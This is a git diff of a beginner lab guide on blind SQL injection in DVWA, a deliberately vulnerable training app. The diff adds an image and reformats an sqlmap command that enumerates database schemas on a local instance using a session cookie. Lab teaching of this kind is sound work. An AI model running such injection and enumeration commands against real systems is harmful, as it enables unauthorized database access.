@@ -1,3 +1,5 @@
+![fa42042d-8c28-45b1-b7c4-7aaf31ff1140](https://github.com/user-attachments/assets/99a73223-42c4-44c4-9dc2-41c443412eef)
+
 ## Lab Instructions
 Blind SQL Injection in DVWA (Beginner Guide)
 
@@ -281,9 +283,9 @@ This level of fingerprinting is incredibly useful for understanding the stack yo
 
 To enumerate all available database schemas, run the following command:
 
-`sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" \
+<pre><code>sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" \
 --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" \
---batch --schema `
+--batch --schema</code></pre>
 
 > 🖼️ A zoomed-in image of the schema discovery output can be included here if you are adding visuals in your GitHub repo for clarity.
 
